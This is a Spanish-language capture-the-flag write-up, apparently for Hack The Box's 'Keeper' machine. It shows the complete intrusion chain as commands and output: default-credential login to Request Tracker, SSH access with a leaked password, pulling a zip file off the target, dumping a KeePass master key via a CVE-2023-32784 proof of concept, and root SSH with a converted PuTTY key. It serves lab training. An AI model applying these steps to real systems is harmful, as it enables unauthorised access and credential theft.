---
layout: post
title: HTB Keeper
date: '2023-11-05 16:50:41 -0500'
categories: [HTB, Easy]
tags: [Web, CVE, Linux, InformationGat, SSH, Putty, CredByDefault  ] 
image:
  path: /keeper/preview.jpg
  alt: Keeper
---

## Resumen

![logo](/keeper/logo.png){: .right w="200" h="200" }

**Keeper** es una máquina **Linux** que implica realizar una enumeración de un **software** en la web, el cual resulta vulnerable al uso de **credenciales por defecto**. Una vez dentro de la aplicación, se puede llevar a cabo una enumeración para obtener credenciales válidas para el servicio **SSH**, además de **recopilar información** sobre la víctima. Dentro del equipo, se descubre un archivo **.zip** que, al ser extraído, revela algunos archivos relacionados con **Keepass**. Tras verificar las versiones, se confirma que están asociadas con la versión **2.x**. La investigación en Google revela la existencia de la **CVE-2023-32784**, que permite al atacante hacer un **volcado (dump) de la clave maestra** del archivo. Gracias a esto y a la enumeración del idioma, es posible comprometer la seguridad del archivo. Dentro del archivo se descubre una clave de conexión por **Putty** que puede ser utilizada para generar una **id_rsa** válida, permitiendo así obtener acceso total al equipo.

## Reconocimiento

Para empezar, Se realiza un **ping** para verificar si existe conexión con la máquina.

```bash
❯ ping -c 1 10.10.11.227
PING 10.10.11.227 (10.10.11.227) 56(84) bytes of data.
64 bytes from 10.10.11.227: icmp_seq=1 ttl=63 time=118 ms

--- 10.10.11.227 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 117.711/117.711/117.711/0.000 ms
```
{: .nolineno}


## Escaneo de Puertos

Ahora es posible realizar un escaneo de puertos con **Nmap** para conocer qué puertos están activos dentro de la máquina.


```bash
nmap -p- --min-rate 2000 10.10.11.227 -Pn 

Nmap scan report for 10.10.11.227
Host is up (0.096s latency).
Not shown: 65292 closed tcp ports (conn-refused), 241 filtered tcp ports (no-response)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```
{: .nolineno}



Después de haber obtenido los puertos, es posible realizar un escaneo más detallado para identificar las versiones que se están ejecutando en los mismos. Esto se puede lograr con el siguiente comando:


```bash
❯ nmap -p22,80 -sVC 10.10.11.227 -Pn 

Nmap scan report for 10.10.11.227
Host is up (0.14s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 35:39:d4:39:40:4b:1f:61:86:dd:7c:37:bb:4b:98:9e (ECDSA)
|_  256 1a:e9:72:be:8b:b1:05:d5:ef:fe:dd:80:d8:ef:c0:66 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
{: .nolineno}


## Enumeración

Al revisar el sitio web que está en ejecución en el puerto 80, se observa un mensaje que indica la existencia del dominio **keeper.htb** y del subdominio **tickets**. Por lo tanto, es posible registrarlos dentro del archivo **/etc/hosts** para obtener acceso a los mismos.

![domain](/keeper/domain.png)

```bash
127.0.0.1   localhost
127.0.1.1   kali
::1     localhost ip6-localhost ip6-loopback
ff02::1     ip6-allnodes
ff02::2     ip6-allrouters

#others
10.10.11.227    keeper.htb tickets.keeper.htb
```
{: .nolineno file="/etc/hosts"}

Cuando se accede al **subdominio**, se visualiza el siguiente formulario de inicio de sesión:

![login](/keeper/login.png)

En la información reflejada, se observa que se está utilizando un software llamado Request Tracker.


> Request Tracker, comúnmente abreviado como RT, es una herramienta de código abierto para que organizaciones de todos los tamaños realicen un seguimiento y administren flujos de trabajo, solicitudes de clientes y tareas de proyectos internos de todo tipo.
{: .prompt-info}

Al investigar en Internet, se descubre que las credenciales por defecto para este software son **root:password**. Por lo tanto, se puede intentar iniciar sesión utilizando estas credenciales.


![defaulcreds](/keeper/defaultcreds.png)


![logincreds](/keeper/usecreds.png)

Al confirmar que son válidas, se logra obtener acceso a la web.


![principalView.png](/keeper/principalView.png)

Después de obtener acceso, se procede a revisar las distintas pestañas de la aplicación. En la pestaña **/admin/users/select** se encuentra información relevante acerca de dos usuarios: uno es el usuario root y el otro es un usuario llamado **lnorgaard**. Se continúa explorando la web en busca de más información.

![users](/keeper/adminview.png)

Al examinar la cuenta del usuario, se observa que la contraseña del usuario está presente en la descripción.

![userpass](/keeper/userpass.png)

Con esto en mente, se intenta acceder por SSH al servidor utilizando el usuario **lnorgaard** y la contraseña **Welcome2023!** con el siguiente comando:


```bash
❯ ssh lnorgaard@10.10.11.227
lnorgaard@10.10.11.227's password:Welcome2023! 
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-78-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage
You have mail.
Last login: Tue Aug  8 11:31:22 2023 from 10.10.14.23
lnorgaard@keeper:~$  
```
{: .nolineno}

## Escalada de Privilegios

Dentro del equipo, se localiza la bandera y se identifica un archivo .zip, por lo que se intenta transferirlo al equipo del atacante para su posterior análisis. Para lograr esto, se puede configurar un servidor en Python y transferir el archivo.

```bash
python3 -m http.server 8081
```
{: .nolineno}

Y dentro del computador del atacante ejecutar el siguiente comando:

```bash
wget http://10.10.11.227:8081/RT30000.zip 
```
{: .nolineno}


Al examinar el contenido del archivo, se descubre la presencia de dos archivos relacionados con Keepass. Se procede a buscar información adicional para determinar posibles acciones a realizar con ellos. 

![keepass](/keeper/keepass.png)


> KeePass es una herramienta que te ayuda a tener todas tus contraseñas seguras almacenadas en un mismo lugar sin necesidad de tener que memorizarlas todas. Recordando solamente una, la clave maestra, podrás acceder a tu base de datos de contraseñas que estará cifrada con los algoritmos AES-256, ChaCha20 y Twofish.
{: .prompt-info}


Durante la investigación, se descubre que Keepass presenta una vulnerabilidad reciente **(CVE-2023-32784)** que permite dumpear la clave maestra, posibilitando el acceso al sistema.

![cve](/keeper/cve.png)


Al buscar información sobre esta vulnerabilidad, se localiza el repositorio [matro7sh](https://github.com/matro7sh/keepass-dump-masterkey), donde se encuentra un **POC** en Python diseñado para explotar la vulnerabilidad.

```bash
git clone https://github.com/matro7sh/keepass-dump-masterkey.git
```
{: .nolineno}



```bash
python3 poc.py -d KeePassDumpFull.dmp
```
{: .nolineno}


Pero se obtiene una gran variedad de posibles contraseñas: 

```bash
Possible password: ●,dgr●d med fl●de
Possible password: ●ldgr●d med fl●de
Possible password: ●`dgr●d med fl●de
Possible password: ●-dgr●d med fl●de
Possible password: ●'dgr●d med fl●de
Possible password: ●]dgr●d med fl●de
Possible password: ●Adgr●d med fl●de
Possible password: ●Idgr●d med fl●de
Possible password: ●:dgr●d med fl●de
Possible password: ●=dgr●d med fl●de
Possible password: ●_dgr●d med fl●de
Possible password: ●cdgr●d med fl●de
Possible password: ●Mdgr●d med fl●de
```
En este momento, es necesario retroceder sobre los pasos ya dados para intentar obtener alguna pista sobre qué hacer en este punto. Al revisar nuevamente la información sobre la víctima, se nota que el usuario es de nacionalidad danesa, y en ese idioma existen caracteres que no están contemplados en la respuesta actual. Por lo tanto, podrían formar parte de valores que están **censurados** por el punto en la respuesta.

![lenguaje](/keeper/lenguaje.png)

Con esto en mente, se puede intentar subir la contraseña al traductor de Google y eliminar los valores censurados, con la esperanza de encontrar alguna coincidencia o que el sistema asuma que está mal escrito.

![contraseña](/keeper/contrasena.png)

Ahora, asumiendo que el símbolo faltante es **ø**, se puede intentar probar con todas las contraseñas dentro de la web [keeweb](https://app.keeweb.info/) para obtener la información guardada por el usuario.

![keeweb](/keeper/keeweb.png)

![putty](/keeper/puttyssh.png)

Al revisar la información resguardada, se observa una llave **id_rsa**, pero está en formato para **Putty**. Por lo tanto, es necesario utilizar **Puttygen** para darle el formato adecuado y así permitir la conexión a través de SSH. Para esto, es necesario guardar el contenido en un archivo **.pkk** y utilizar el siguiente comando:


```bash
 puttygen key.pkk -O private-openssh -o id_rsa
```
{: .nolineno}


Solo hace falta darle los permisos correctos y conectarse por SSH como root:


```bash
chmod 600 id_rsa
```
{: .nolineno}


```bash
ssh root@10.10.11.227 -i id_rsa
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-78-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage
You have new mail.
Last login: Tue Aug  8 19:00:06 2023 from 10.10.14.41
root@keeper:~# whoami
root
root@keeper:~# hostname
keeper
root@keeper:~# ls
root.txt  RT30000.zip  SQL
root@keeper:~# 
```
{: .nolineno}














